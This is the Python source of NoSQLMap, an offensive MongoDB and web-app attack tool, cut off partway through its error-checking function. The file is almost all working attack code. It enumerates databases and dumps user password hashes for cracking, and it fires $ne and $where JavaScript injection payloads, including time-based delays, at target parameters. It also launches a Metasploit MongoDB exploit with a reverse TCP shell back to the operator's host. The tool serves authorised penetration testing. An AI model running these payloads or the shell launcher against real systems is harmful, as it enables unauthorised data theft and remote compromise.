#!/usr/bin/python
#NoSQLMap Copyright 2014 Russell Butturini
#This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
#the Free Software Foundation, either version 3 of the License, or
#(at your option) any later version.

#This program is distributed in the hope that it will be useful,
#but WITHOUT ANY WARRANTY; without even the implied warranty of
#MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#GNU General Public License for more details.

#You should have received a copy of the GNU General Public License
#along with this program.  If not, see <http://www.gnu.org/licenses/>.


import sys
import string
import random
import os
import time
import httplib2
import urllib
import urllib2
import pymongo
import subprocess
import json
import gridfs
import ipcalc
import signal
import ast
import datetime
import itertools
import re
from hashlib import md5
from threading import Thread
import Queue

#Set a list so we can track whether options are set or not to avoid resetting them in subsequent cals to the options menu.
global optionSet
optionSet = [False,False,False,False,False,False,False,False,False]
global yes_tag
global no_tag
yes_tag = ['y', 'Y']
no_tag = ['n', 'N']
global victim
global webPort
global uri
global httpMethod
global https
global myIP
global myPort
global verb
global scanNeedCreds
global dbPort
dbPort = 27017

def mainMenu():
	mmSelect = True
	while mmSelect:
		os.system('clear')
		#label = subprocess.check_output(["git","describe","--always"])
		print "===================================================="
		print " _   _       _____  _____ _     ___  ___            "
		print "| \ | |     /  ___||  _  | |    |  \/  |            "
		print "|  \| | ___ \ `--. | | | | |    | .  . | __ _ _ __  "
		print "| . ` |/ _ \ `--. \| | | | |    | |\/| |/ _` | '_ \ "
		print "| |\  | (_) /\__/ /\ \/' / |____| |  | | (_| | |_) |"
		print "\_| \_/\___/\____/  \_/\_\_____/\_|  |_/\__,_| .__/"
		print "===================================================="
		print "NoSQLMap-v0.4DEV"
		print "nosqlmap@gmail.com"
		print "\n"
		print "1-Set options"
		print "2-NoSQL DB Access Attacks"
		print "3-NoSQL Web App attacks"
		print "4-Scan for Anonymous MongoDB Access"
		print "x-Exit"

		select = raw_input("Select an option: ")

		if select == "1":
			options()

		elif select == "2":
			if optionSet[0] == True:
				netAttacks(victim)
				
			#Check minimum required options
			else:
				raw_input("Target not set! Check options.  Press enter to continue...")
				
		
		elif select == "3":
			#Check minimum required options
			if (optionSet[0] == True) and (optionSet[2] == True):	
				if httpMethod == "GET":
					getApps()
				
				else:
					postApps()
			
			else:
				raw_input("Options not set! Check host and URI path.  Press enter to continue...")
				
				
		elif select == "4":
			massMongo()

		elif select == "x":
			sys.exit()
			
		else:
			raw_input("Invalid selection.  Press enter to continue.")
			

def options():
	global victim
	global webPort
	global uri
	global https
	global httpMethod
	global postData
	global myIP
	global myPort
	global verb
	global mmSelect
	global dbPort
	
	#Set default value if needed
	if optionSet[0] == False:
		global victim
		victim = "Not Set"
	if optionSet[1] == False:
		global webPort
		webPort = 80
		optionSet[1] = True
	if optionSet[2] == False:
		global uri
		uri = "Not Set"
	if optionSet[3] == False:
		global httpMethod
		httpMethod = "GET"
	if optionSet[4] == False:
		global myIP
		myIP = "Not Set"
	if optionSet[5] == False:
		global myPort
		myPort = "Not Set"
	if optionSet[6] == False:
		verb = "OFF"
		optSelect = True
	if optionSet[8] == False:
		https = "OFF"
		optSelect = True
	
	while optSelect:	
		print "\n\n"
		print "Options"
		print "1-Set target host/IP (Current: " + str(victim) + ")"
		print "2-Set web app port (Current: " + str(webPort) + ")" 
		print "3-Set App Path (Current: " + str(uri) + ")"
		print "4-Toggle HTTPS (Current: " + str(https) + ")"
		print "5-Set MongoDB Port (Current : " + str(dbPort) + ")"
		print "6-Set HTTP Request Method (GET/POST) (Current: " + httpMethod + ")"
		print "7-Set my local Mongo/Shell IP (Current: " + str(myIP) + ")"
		print "8-Set shell listener port (Current: " + str(myPort) + ")"
		print "9-Toggle Verbose Mode: (Current: " + str(verb) + ")"
		print "0-Load options file"
		print "a-Load options from saved Burp request"
		print "b-Save options file"
		print "x-Back to main menu"

		select = raw_input("Select an option: ")
		
		if select == "1":
			#Unset the boolean if it's set since we're setting it again.
			optionSet[0] = False
			ipLen = False
			
			while optionSet[0] == False:
				goodDigits = True
				notDNS = True
				victim = raw_input("Enter the host IP/DNS name: ")
				#make sure we got a valid IP
				octets = victim.split(".")
				
				if len(octets) != 4:
					#Treat this as a DNS name
					optionSet[0] = True
					notDNS = False
				
				#If the format of the IP is good, check and make sure the octets are all within acceptable ranges.
				for item in octets:
					try:
						if int(item) < 0 or int(item) > 255:
							print "Bad octet in IP address."
							goodDigits = False
									
					except:
						#Must be a DNS name (for now)
						
						notDNS = False
				
				#If everything checks out set the IP and break the loop
				if goodDigits == True or notDNS == False:
					print "\nTarget set to " + victim + "\n"
					optionSet[0] = True
			
		elif select == "2":
			webPort = raw_input("Enter the HTTP port for web apps: ")
			print "\nHTTP port set to " + webPort + "\n"
			optionSet[1] = True

		elif select == "3":
			uri = raw_input("Enter URI Path (Press enter for no URI): ")
			print "\nURI Path set to " + uri + "\n"
			optionSet[2] = True
			
		elif select == "4":
			if https == "OFF":
				print "HTTPS enabled."
				https = "ON"
				optionSet[8] = True
			
			elif verb == "ON":
				print "HTTPS disabled."
				https = "OFF"
				optionSet[8] = True
			
		
		elif select == "5":
			dbPort = int(raw_input("Enter target MongoDB port: "))
			print "\nTarget Mongo Port set to " + str(dbPort) + "\n"
			optionSet[7] = True

		elif select == "6":
			httpMethod = True
			while httpMethod == True:

				print "1-Send request as a GET"
				print "2-Send request as a POST"
				httpMethod = raw_input("Select an option: ")
			
				if httpMethod == "1":
					httpMethod = "GET"
					print "GET request set"
					optionSet[3] = True

				elif httpMethod == "2":
					print "POST request set"
					optionSet[3] = True
					postDataIn = raw_input("Enter POST data in a comma separated list (i.e. param name 1,value1,param name 2,value2)\n")
					pdArray = postDataIn.split(",")
					paramNames = pdArray[0::2]
					paramValues = pdArray[1::2]
					postData = dict(zip(paramNames,paramValues))
					httpMethod = "POST"
				else:
					print "Invalid selection"

		elif select == "7":
			#Unset the setting boolean since we're setting it again.
			optionSet[4] = False
			goodLen = False
			goodDigits = False
			while optionSet[4] == False:
				myIP = raw_input("Enter the host IP for my Mongo/Shells: ")
				#make sure we got a valid IP
				octets = myIP.split(".")
				#If there aren't 4 octets, toss an error.
				if len(octets) != 4:
					print "Invalid IP length."
				
				else:
					goodLen = True
				
				if goodLen == True:	
				#If the format of the IP is good, check and make sure the octets are all within acceptable ranges.
					for item in octets:
						if int(item) < 0 or int(item) > 255:
							print "Bad octet in IP address."
							goodDigits = False
						
						else:
							goodDigits = True
						
				
				#If everything checks out set the IP and break the loop
				if goodLen == True and goodDigits == True:
					print "\nShell/DB listener set to " + myIP + "\n"
					optionSet[4] = True
		
		elif select == "8":
			myPort = raw_input("Enter TCP listener for shells: ")
			print "Shell TCP listener set to " + myPort + "\n"
			optionSet[5] = True
		
		elif select == "9":
			if verb == "OFF":
				print "Verbose output enabled."
				verb = "ON"
				optionSet[6] = True
			
			elif verb == "ON":
				print "Verbose output disabled."
				verb = "OFF"
				optionSet[6] = True
			
		elif select == "0":
			loadPath = raw_input("Enter file name to load: ")
			try:
				fo = open(loadPath,"r" )
				csvOpt = fo.readlines()
				fo.close()
				optList = csvOpt[0].split(",")
				victim = optList[0]
				webPort = optList[1]
				uri = optList[2]
				httpMethod = optList[3]
				myIP = optList[4]
				myPort = optList[5]
				
				if httpMethod == "POST":
					postData = ast.literal_eval(csvOpt[1])
				
				#Set option checking array based on what was loaded
				x = 0
				for item in optList:
					if item != "Not Set":
						optionSet[x] = True
					x += 1
			except:
				print "Couldn't load options file!"
		
		elif select == "a":
			loadPath = raw_input("Enter path to Burp request file: ")

			try:
				fo = open(loadPath,"r")
				reqData = fo.readlines()
				
			except:
				raw_input("error reading file.  Press enter to continue...")
				return

			methodPath = reqData[0].split(" ")

			if methodPath[0] == "GET":
				httpMethod = "GET"
			
			elif methodPath[0] == "POST":
				paramNames = []
				paramValues = []
				httpMethod = "POST"
				postData = reqData[len(reqData)-1]
				#split the POST parameters up into individual items
				paramsNvalues = postData.split("&")
				
				for item in paramsNvalues:
					tempList = item.split("=")
					paramNames.append(tempList[0])
					paramValues.append(tempList[1])
				
				postData = dict(zip(paramNames,paramValues))
				
			else:
				print "unsupported method in request header."
			
			victim = reqData[1].split( " ")[1].replace("\r\n","")
			optionSet[0] = True
			uri = methodPath[1].replace("\r\n","")
			optionSet[2] = True			
			
		elif select == "b":
			savePath = raw_input("Enter file name to save: ")
			try:
				fo = open(savePath, "wb")
				fo.write(str(victim) + "," + str(webPort) + "," + str(uri) + "," + str(httpMethod) + "," + str(myIP) + "," + str(myPort))
				
				if httpMethod == "POST":
					fo.write(",\n"+ str(postData))
				fo.close()
				print "Options file saved!"
			except:
				print "Couldn't save options file."

		elif select == "x":
			return
			
def netAttacks(target):
	print "DB Access attacks"
	print "================="
	mgtOpen = False
	webOpen = False
	mgtSelect = True
	#This is a global for future use with other modules; may change
	global dbList
	global dbPort
	dbList = []
	
	print "Checking to see if credentials are needed..."
	needCreds = accessCheck(target,dbPort,False)
	
	if needCreds[0] == 0:
		conn = pymongo.MongoClient(target,dbPort)
		print "Successful access with no credentials!"
		mgtOpen = True
	
	elif needCreds[0] == 1:
		print "Login required!"
		srvUser = raw_input("Enter server username: ")
		srvPass = raw_input("Enter server password: ")
		uri = "mongodb://" + srvUser + ":" + srvPass + "@" + target +"/"
		
		try:
			conn = pymongo.MongoClient(target)
			print "MongoDB authenticated on " + target + ":27017!"
			mgtOpen = True
		except:
			raw_input("Failed to authenticate.  Press enter to continue...")
			return
	
	elif needCreds[0] == 2:
		conn = pymongo.MongoClient(target,dbPort)
		print "Access check failure.  Testing will continue but will be unreliable."
		mgtOpen = True
	
	elif needCreds[0] == 3:
		print "Couldn't connect to Mongo server."
		return
	
	
	mgtUrl = "http://" + target + ":28017"	
	#Future rev:  Add web management interface parsing
	
	try:
		mgtRespCode = urllib.urlopen(mgtUrl).getcode()
		if mgtRespCode == 200:
			print "MongoDB web management open at " + mgtUrl + ".  No authentication required!"
			testRest = raw_input("Start tests for REST Interface (y/n)? ")

		if testRest in yes_tag:
			restUrl = mgtUrl + "/listDatabases?text=1"
			restResp = urllib.urlopen(restUrl).read()
			restOn = restResp.find('REST is not enabled.')

			if restOn == -1:
				print "REST interface enabled!"
				dbs = json.loads(restResp)
				menuItem = 1
				print "List of databases from REST API:"

				for x in range(0,len(dbs['databases'])):
					dbTemp= dbs['databases'][x]['name']
					print str(menuItem) + "-" + dbTemp
					menuItem += 1
			else:
				print "REST interface not enabled."
			print "\n"

	except:		
		print "MongoDB web management closed or requires authentication."	
		
	if mgtOpen == True:
		
		while mgtSelect:
			print "\n"
			print "1-Get Server Version and Platform"
			print "2-Enumerate Databases/Collections/Users"
			print "3-Check for GridFS"
			print "4-Clone a Database"
			print "5-Launch Metasploit Exploit for Mongo < 2.2.4"
			print "6-Return to Main Menu"
			attack = raw_input("Select an attack: ")
	
			if attack == "1":
				print "\n"
				getPlatInfo(conn)
			
			if attack == "2":
				print "\n"
				enumDbs(conn)
			
			if attack == "3":
				print "\n"
				enumGrid(conn)
			
			if attack == "4":
				print "\n"
				stealDBs(myIP,conn)
			
			if attack == "5":
				print "\n"
				msfLaunch()
			
			if attack == "6":
				return
			
			
				
def getPlatInfo (mongoConn):
	print "Server Info:"
	print "MongoDB Version: " + mongoConn.server_info()['version']
	print "Debugs enabled : " + str(mongoConn.server_info()['debug'])
	print "Platform: " + str(mongoConn.server_info()['bits']) + " bit"
	print "\n"
	return

def enumDbs (mongoConn):
	try:
		print "List of databases:"
		print "\n".join(mongoConn.database_names())
		print "\n"
			
	except:
		print "Error:  Couldn't list databases.  The provided credentials may not have rights."
	
	print "List of collections:"
		
	try:
		for dbItem in mongoConn.database_names():
			db = mongoConn[dbItem]
			print dbItem + ":"
			print "\n".join(db.collection_names())
			print "\n"
				
			if 'system.users' in db.collection_names():
				users = list(db.system.users.find())
				print "Database Users and Password Hashes:"
					
				for x in range (0,len(users)):
					print "Username: " + users[x]['user']
					print "Hash: " + users[x]['pwd']
					print "\n"
					crack = raw_input("Crack this hash (y/n)? ")
						
					if crack in yes_tag:
						passCrack(users[x]['user'],users[x]['pwd'])
					
	except:
		print "Error:  Couldn't list collections.  The provided credentials may not have rights."
		
	print "\n"
	return

def enumGrid (mongoConn):
	try:
		for dbItem in mongoConn.database_names():
			try:
				db = mongoConn[dbItem]
				fs = gridfs.GridFS(db)
				files = fs.list()
				print "GridFS enabled on database " + str(dbItem)
				print " list of files:"
				print "\n".join(files)
					
			except:
				print "GridFS not enabled on " + str(dbItem) + "."
			
	except:
		print "Error:  Couldn't enumerate GridFS.  The provided credentials may not have rights."
							
	return

			
def msfLaunch():			
	try:
		proc = subprocess.call("msfcli exploit/linux/misc/mongod_native_helper RHOST=" + str(victim) +" DB=local PAYLOAD=linux/x86/shell/reverse_tcp LHOST=" + str(myIP) + " LPORT="+ str(myPort) + " E", shell=True)
			
	except:
		print "Something went wrong.  Make sure Metasploit is installed and path is set, and all options are defined."	
	raw_input("Press enter to continue...")
	return
		
	
def postApps():
	print "Web App Attacks (POST)"
	print "==============="
	paramName = []
	paramValue = []
	global vulnAddrs
	vulnAddrs = []
	global possAddrs
	possAddrs = []
	timeVulnsStr = []
	timeVulnsInt = []
	appUp = False
	strTbAttack = False
	intTbAttack = False
	trueStr = False
	trueInt = False
	global postData
	global neDict
	testNum = 1
	
	#Verify app is working.  
	print "Checking to see if site at " + str(victim) + ":" + str(webPort) + str(uri) + " is up..."
	
	if https == "OFF":
		appURL = "http://" + str(victim) + ":" + str(webPort) + str(uri)
	
	elif https == "ON":
		appURL = "https://" + str(victim) + ":" + str(webPort) + str(uri)
	
	try:
		body = urllib.urlencode(postData)
		req = urllib2.Request(appURL,body)
		appRespCode = urllib2.urlopen(req).getcode()
		
		if appRespCode == 200:
			
			normLength = int(len(urllib2.urlopen(req).read()))
			timeReq = urllib2.urlopen(req)
			start = time.time()
			page = timeReq.read()
			end = time.time()
			timeReq.close()
			timeBase = round((end - start), 3)
			
			if verb == "ON":
				print "App is up! Got response length of " + str(normLength) + " and response time of " + str(timeBase) + " seconds.  Starting injection test.\n"
				
			else:
				print "App is up!"
			appUp = True
		else:
			print "Got " + str(appRespCode) + "from the app, check your options."
	
	except:
		print "Looks like the server didn't respond.  Check your options."
	
	if appUp == True:
		
		menuItem = 1
		print "List of parameters:"
		for params in postData.keys():
			print str(menuItem) + "-" + params
			menuItem += 1
		
		try:
			injIndex = raw_input("Which parameter should we inject? ")
			injOpt = str(postData.keys()[int(injIndex)-1])
			print "Injecting the " + injOpt + " parameter..."
		except:
			raw_input("Something went wrong.  Press enter to return to the main menu...")
			return
		
		injectSize = raw_input("Baseline test-Enter random string size: ")
		injectString = randInjString(int(injectSize))
		print "Using " + injectString + " for injection testing.\n"
		
		#Build a random string and insert; if the app handles input correctly, a random string and injected code should be treated the same.
		#Add error handling for Non-200 HTTP response codes if random strings freak out the app.
		postData.update({injOpt:injectString})
		if verb == "ON":
			print "Checking random injected parameter HTTP response size sending " + str(postData) +"...\n"
		
		else:
			print "Sending random parameter value..."
		
		body = urllib.urlencode(postData)
		req = urllib2.Request(appURL,body)
		randLength = int(len(urllib2.urlopen(req).read()))
		print "Got response length of " + str(randLength) + "."
		
		randNormDelta = abs(normLength - randLength)
		
		if randNormDelta == 0: 
			print "No change in response size injecting a random parameter..\n"
		else:
			print "Random value variance: " + str(randNormDelta) + "\n" 
			
		#Generate not equals injection
		neDict = postData
		neDict[injOpt + "[$ne]"] = neDict[injOpt]
		del neDict[injOpt]
		body = urllib.urlencode(neDict)
		req = urllib2.Request(appURL,body)
		if verb == "ON":
			print "Testing Mongo PHP not equals associative array injection using " + str(postData) +"..."
		
		else:
			print "Test 1: PHP associative array injection"

		errorCheck = errorTest(str(urllib2.urlopen(req).read()),testNum)
		
		if errorCheck == False:
			injLen = int(len(urllib2.urlopen(req).read()))			
			checkResult(randLength,injLen,testNum)
			testNum += 1
		
		else:
			testNum +=1
		print "\n"
		
		#Delete the extra key
		del postData[injOpt + "[$ne]"]
		postData.update({injOpt:"a'; return db.a.find(); var dummy='!"})
		body = urllib.urlencode(postData)
		req = urllib2.Request(appURL,body)
		if verb == "ON":
			print "Testing Mongo <2.4 $where all Javascript string escape attack for all records...\n"
			print "Injecting " + str(postData)
		
		else:
			print "Test 2: $where injection (string escape)"
		
		errorCheck = errorTest(str(urllib2.urlopen(req).read()),testNum)
		
		if errorCheck == False:
			injLen = int(len(urllib2.urlopen(req).read()))
			checkResult(randLength,injLen,testNum)
			testNum += 1
		else:
			testNum += 1
		
		print "\n"
		
		postData.update({injOpt:"1; return db.a.find(); var dummy=1"})
		body = urllib.urlencode(postData)
		req = urllib2.Request(appURL,body)
		if verb == "ON":
			print "Testing Mongo <2.4 $where Javascript integer escape attack for all records...\n"
			print "Injecting " + str(postData)
		else:
			print "Test 3: $where injection (integer escape)"
		
		errorCheck = errorTest(str(urllib2.urlopen(req).read()),testNum)
		
		if errorCheck == False:
			injLen = int(len(urllib2.urlopen(req).read()))
			checkResult(randLength,injLen,testNum)
			testNum += 1
		else:
			testNum += 1
		print "\n"

		#Start a single record attack in case the app expects only one record back
		postData.update({injOpt:"a'; return db.a.findOne(); var dummy='!"})
		body = urllib.urlencode(postData)
		req = urllib2.Request(appURL,body)
		if verb == "ON":
			print "Testing Mongo <2.4 $where all Javascript string escape attack for one record...\n"
			print " Injecting " + str(postData)
		
		else:
			print "Test 4: $where injection string escape (single record)"
		
		errorCheck = errorTest(str(urllib2.urlopen(req).read()),testNum)
		
		if errorCheck == False:
			injLen = int(len(urllib2.urlopen(req).read()))
			checkResult(randLength,injLen,testNum)
			testNum += 1
		
		else:
			testNum += 1
		print "\n"
		
		postData.update({injOpt:"1; return db.a.findOne(); var dummy=1"})
		body = urllib.urlencode(postData)
		req = urllib2.Request(appURL,body)
		if verb == "ON":
			print "Testing Mongo <2.4 $where Javascript integer escape attack for one record...\n"
			print " Injecting " + str(postData)
		
		else:
			print "Test 5: $where injection integer escape (single record)"
		
		errorCheck = errorTest(str(urllib2.urlopen(req).read()),testNum)
		
		if errorCheck == False:
			injLen = int(len(urllib2.urlopen(req).read()))
			checkResult(randLength,injLen,testNum)
			testNum += 1
		
		else:
			testNum += 1
		print "\n"
		
		postData.update({injOpt:"a'; return this.a != '" + injectString + "'; var dummy='!"})
		body = urllib.urlencode(postData)
		req = urllib2.Request(appURL,body)
		
		if verb == "ON":
			print "Testing Mongo this not equals string escape attack for all records..."
			print " Injecting " + str(postData)
		
		else:
			print "Test 6: This != injection (string escape)"
		
		errorCheck = errorTest(str(urllib2.urlopen(req).read()),testNum)
		
		if errorCheck == False:
			injLen = int(len(urllib2.urlopen(req).read()))
			checkResult(randLength,injLen,testNum)
			testNum += 1
			print "\n"
		else:
			testNum += 1
			
		postData.update({injOpt:"1; return this.a != '" + injectString + "'; var dummy=1"})
		body = urllib.urlencode(postData)
		req = urllib2.Request(appURL,body)
		
		if verb == "ON":
			print "Testing Mongo this not equals integer escape attack for all records..."
			print " Injecting " + str(postData)
		else:
			print "Test 7:  This != injection (integer escape)"
		
		errorCheck = errorTest(str(urllib2.urlopen(req).read()),testNum)
		
		if errorCheck == False:
			injLen = int(len(urllib2.urlopen(req).read()))
			checkResult(randLength,injLen,testNum)
			testNum += 1
		
		else:
			testNum += 1
		print "\n"
		
		doTimeAttack = raw_input("Start timing based tests (y/n)? ")
		
		if doTimeAttack == "y" or doTimeAttack == "Y":
			print "Starting Javascript string escape time based injection..."
			postData.update({injOpt:"a'; var date = new Date(); var curDate = null; do { curDate = new Date(); } while((Math.abs(curDate.getTime()-date.getTime()))/1000 < 10); return true; var dummy='a"})
			body = urllib.urlencode(postData)
			conn = urllib2.urlopen(req,body)
			start = time.time()
			page = conn.read()
			end = time.time()
			conn.close()
			print str(end)
			print str(start)
			strTimeDelta = (int(round((end - start), 3)) - timeBase)
			#print str(strTimeDelta)
			if strTimeDelta > 25:
				print "HTTP load time variance was " + str(strTimeDelta) +"  seconds! Injection possible."
				strTbAttack = True
			
			else:
				print "HTTP load time variance was only " + str(strTimeDelta) + " seconds.  Injection probably didn't work."
				strTbAttack = False
			
			print "Starting Javascript integer escape time based injection..."
			
			postData.update({injOpt:"1; var date = new Date(); var curDate = null; do { curDate = new Date(); } while((Math.abs(date.getTime()-curDate.getTime()))/1000 < 10); return; var dummy=1"})
			body = urllib.urlencode(postData)
			start = time.time()
			conn = urllib2.urlopen(req,body)
			page = conn.read()
			end = time.time()			
			conn.close()
			print str(end)
			print str(start)
			intTimeDelta = ((end-start) - timeBase)
			#print str(strTimeDelta)
			if intTimeDelta > 25:
				print "HTTP load time variance was " + str(intTimeDelta) +" seconds! Injection possible."
				intTbAttack = True
			
			else:
				print "HTTP load time variance was only " + str(intTimeDelta) + " seconds.  Injection probably didn't work."
				intTbAttack = False
		
		print "\n"	
		print "Exploitable requests:"
		print "\n".join(vulnAddrs)
		print "\n"
		print "Possibly vulnerable requests:"
		print"\n".join(possAddrs)
		print "\n"
		print "Timing based attacks:"
		
		if strTbAttack == True:
			print "String attack-Successful"
		else:
			print "String attack-Unsuccessful"
		if intTbAttack == True:
			print "Integer attack-Successful"
		else:
			print "Integer attack-Unsuccessful"
		
		fileOut = raw_input("Save results to file (y/n)? ")
		
		if fileOut in yes_tag:
			savePath = raw_input("Enter output file name: ")
			fo = open(savePath, "wb")
			fo.write ("Vulnerable Requests:\n")
			fo.write("\n".join(vulnAddrs))
			fo.write("\n\n")
			fo.write("Possibly Vulnerable Requests:\n")
			fo.write("\n".join(possAddrs))
			fo.write("\n")
			fo.write("Timing based attacks:\n")
			
			if strTbAttack == True:
				fo.write("String Attack-Successful\n")
			else:
				fo.write("String Attack-Unsuccessful\n")
			fo.write("\n")
			
			if intTbAttack == True:
				fo.write("Integer attack-Successful\n")
			else:
				fo.write("Integer attack-Unsuccessful\n")
			fo.write("\n")
			fo.close()
		
	raw_input("Press enter to continue...")
	return()	
	
def getApps():
	print "Web App Attacks (GET)"
	print "==============="
	paramName = []
	global testNum
	testNum = 1
	paramValue = []
	global vulnAddrs
	vulnAddrs = []
	global possAddrs
	possAddrs = []
	timeVulnsStr = []
	timeVulnsInt = []
	appUp = False
	strTbAttack = False
	intTbAttack = False
	trueStr = False
	trueInt = False
	global lt24
	lt24 = False
	global str24
	str24 = False
	global int24
	int24 = False
		
	#Verify app is working.  
	print "Checking to see if site at " + str(victim) + ":" + str(webPort) + str(uri) + " is up..."
	
	if https == "OFF":
		appURL = "http://" + str(victim) + ":" + str(webPort) + str(uri)
	
	elif https == "ON":
		appURL = "https://" + str(victim) + ":" + str(webPort) + str(uri)
	try:
		appRespCode = urllib.urlopen(appURL).getcode()
		if appRespCode == 200:
			normLength = int(len(urllib.urlopen(appURL).read()))
			timeReq = urllib.urlopen(appURL)
			start = time.time()
			page = timeReq.read()
			end = time.time()
			timeReq.close()
			timeBase = round((end - start), 3)
			
			if verb == "ON":
				print "App is up! Got response length of " + str(normLength) + " and response time of " + str(timeBase) + " seconds.  Starting injection test.\n"
			
			else:
				print "App is up!"
			appUp = True
		
		else:
			print "Got " + str(appRespCode) + "from the app, check your options."
	except:
		print "Looks like the server didn't respond.  Check your options."
	
	if appUp == True:
			
		injectSize = raw_input("Baseline test-Enter random string size: ")
		injectString = randInjString(int(injectSize))
		print "Using " + injectString + " for injection testing.\n"
		
		#Build a random string and insert; if the app handles input correctly, a random string and injected code should be treated the same.
		#Add error handling for Non-200 HTTP response codes if random strings freaks out the app.
		randomUri = buildUri(appURL,injectString)
		
		if verb == "ON":
			print "Checking random injected parameter HTTP response size using " + randomUri +"...\n"
		else:
			print "Sending random parameter value..."
		
		randLength = int(len(urllib.urlopen(randomUri).read()))
		print "Got response length of " + str(randLength) + "."
		randNormDelta = abs(normLength - randLength)
		
		if randNormDelta == 0: 
			print "No change in response size injecting a random parameter..\n"
		else:
			print "Random value variance: " + str(randNormDelta) + "\n"
			
		if verb == "ON":
			print "Testing Mongo PHP not equals associative array injection using " + uriArray[1] +"..."
		else:
			print "Test 1: PHP associative array injection"
			
		#Test for errors returned by injection
		errorCheck = errorTest(str(urllib.urlopen(uriArray[1]).read()),testNum)
		
		if errorCheck == False:
			injLen = int(len(urllib.urlopen(uriArray[1]).read()))	
			checkResult(randLength,injLen,testNum)
			testNum += 1
		else:
			testNum += 1

		print "\n"
		if verb == "ON":
			print "Testing Mongo <2.4 $where all Javascript string escape attack for all records...\n"
			print "Injecting " + uriArray[2]
		else:
			print "Test 2: $where injection (string escape)"
		
		
		errorCheck = errorTest(str(urllib.urlopen(uriArray[2]).read()),testNum)
		
			
		if errorCheck == False:		
			injLen = int(len(urllib.urlopen(uriArray[2]).read()))
			checkResult(randLength,injLen,testNum)
			testNum += 1
		
		else:
			testNum += 1
		
		print "\n"
		if verb == "ON":
			print "Testing Mongo <2.4 $where Javascript integer escape attack for all records...\n"
			print "Injecting " + uriArray[3]
		else:
			print "Test 3:  $where injection (integer escape)"
		
		errorCheck = errorTest(str(urllib.urlopen(uriArray[3]).read()),testNum)
		
		
		if errorCheck == False:
			injLen = int(len(urllib.urlopen(uriArray[3]).read()))
			checkResult(randLength,injLen,testNum)
			testNum +=1
		
		else:
			testNum +=1
				
		#Start a single record attack in case the app expects only one record back
		print "\n"		
		if verb == "ON":
			print "Testing Mongo <2.4 $where all Javascript string escape attack for one record...\n"
			print " Injecting " + uriArray[4]
		else:
			print "Test 4: $where injection string escape (single record)"
		
		
		errorCheck = errorTest(str(urllib.urlopen(uriArray[4]).read()),testNum)
		
		if errorCheck == False:
			injLen = int(len(urllib.urlopen(uriArray[4]).read()))
			checkResult(randLength,injLen,testNum)
			testNum += 1
		else:
			testNum += 1
				
		print "\n"
		if verb == "ON":
			print "Testing Mongo <2.4 $where Javascript integer escape attack for one record...\n"
			print " Injecting " + uriArray[5]
		else:
			print "Test 5: $where injection integer escape (single record)"
		
		errorCheck = errorTest(str(urllib.urlopen(uriArray[5]).read()),testNum)
		
		if errorCheck == False:
			injLen = int(len(urllib.urlopen(uriArray[5]).read()))
			checkResult(randLength,injLen,testNum)
			testNum +=1
		
		else:
			testNum += 1
			
		print "\n"
		if verb == "ON":
			print "Testing Mongo this not equals string escape attack for all records..."
			print " Injecting " + uriArray[6]
		else:
			print "Test 6: This != injection (string escape)"
			
		errorCheck = errorTest(str(urllib.urlopen(uriArray[6]).read()),testNum)
		
		if errorCheck == False:
			injLen = int(len(urllib.urlopen(uriArray[6]).read()))
			checkResult(randLength,injLen,testNum)
			testNum += 1
		else:
			testNum += 1
			
		print "\n"
		if verb == "ON":
			print "Testing Mongo this not equals integer escape attack for all records..."
			print " Injecting " + uriArray[7]
		else:
			print "Test 7: This != injection (integer escape)"
		
		errorCheck = errorTest(str(urllib.urlopen(uriArray[7]).read()),testNum)
		
		if errorCheck == False:
			injLen = int(len(urllib.urlopen(uriArray[7]).read()))
			checkResult(randLength,injLen,testNum)
			testNum += 1
		else:
			testNum += 1
		print "\n"
		
		doTimeAttack = raw_input("Start timing based tests (y/n)? ")
		
		if doTimeAttack in yes_tag:
			print "Starting Javascript string escape time based injection..."
			start = time.time()
			strTimeInj = urllib.urlopen(uriArray[8])
			page = strTimeInj.read()
			end = time.time()
			strTimeInj.close()
			#print str(end)
			#print str(start)
			strTimeDelta = (int(round((end - start), 3)) - timeBase)
			#print str(strTimeDelta)
			if strTimeDelta > 25:
				print "HTTP load time variance was " + str(strTimeDelta) +" seconds! Injection possible."
				strTbAttack = True
			
			else:
				print "HTTP load time variance was only " + str(strTimeDelta) + " seconds.  Injection probably didn't work."
				strTbAttack = False
			
			print "Starting Javascript integer escape time based injection..."
			start = time.time()
			intTimeInj = urllib.urlopen(uriArray[9])
			page = intTimeInj.read()
			end = time.time()
			intTimeInj.close()
			#print str(end)
			#print str(start)
			intTimeDelta = (int(round((end - start), 3)) - timeBase)
			#print str(strTimeDelta)
			if intTimeDelta > 25:
				print "HTTP load time variance was " + str(intTimeDelta) +" seconds! Injection possible."
				intTbAttack = True
			
			else:
				print "HTTP load time variance was only " + str(intTimeDelta) + " seconds.  Injection probably didn't work."
				intTbAttack = False
		
		if lt24 == True:
			bfInfo = raw_input("MongoDB < 2.4 detected.  Start brute forcing database info (y/n)? ")
			
			if bfInfo in yes_tag:
				getDBInfo()
				
		
		print "\n"	
		print "Vunerable URLs:"
		print "\n".join(vulnAddrs)
		print "\n"
		print "Possibly vulnerable URLs:"
		print"\n".join(possAddrs)
		print "\n"
		print "Timing based attacks:"
		
		if strTbAttack == True:
			print "String attack-Successful"
		else:
			print "String attack-Unsuccessful"
		if intTbAttack == True:
			print "Integer attack-Successful"
		else:
			print "Integer attack-Unsuccessful"
		
		fileOut = raw_input("Save results to file (y/n)? ")
		
		if fileOut in yes_tag:
			savePath = raw_input("Enter output file name: ")
			fo = open(savePath, "wb")
			fo.write ("Vulnerable URLs:\n")
			fo.write("\n".join(vulnAddrs))
			fo.write("\n\n")
			fo.write("Possibly Vulnerable URLs:\n")
			fo.write("\n".join(possAddrs))
			fo.write("\n")
			fo.write("Timing based attacks:\n")
			
			if strTbAttack == True:
				fo.write("String Attack-Successful\n")
			else:
				fo.write("String Attack-Unsuccessful\n")
			fo.write("\n")
			
			if intTbAttack == True:
				fo.write("Integer attack-Successful\n")
			else:
				fo.write("Integer attack-Unsuccessful\n")
			fo.write("\n")
			fo.close()
		
	raw_input("Press enter to continue...")
	return()

def errorTest (errorCheck,testNum):
	global possAddrs
	global httpMethod
	global neDict
	global postData
	
	if errorCheck.find('ReferenceError') != -1 or errorCheck.find('SyntaxError') != -1 or errorCheck.find('ILLEGAL') != -1:
		print "Injection returned a MongoDB Error.  Injection may be possible."
		
		if httpMethod == "GET":
			possAddrs.append(uriArray[testNum])
			return True
		
		else:
			if testNum == 1:
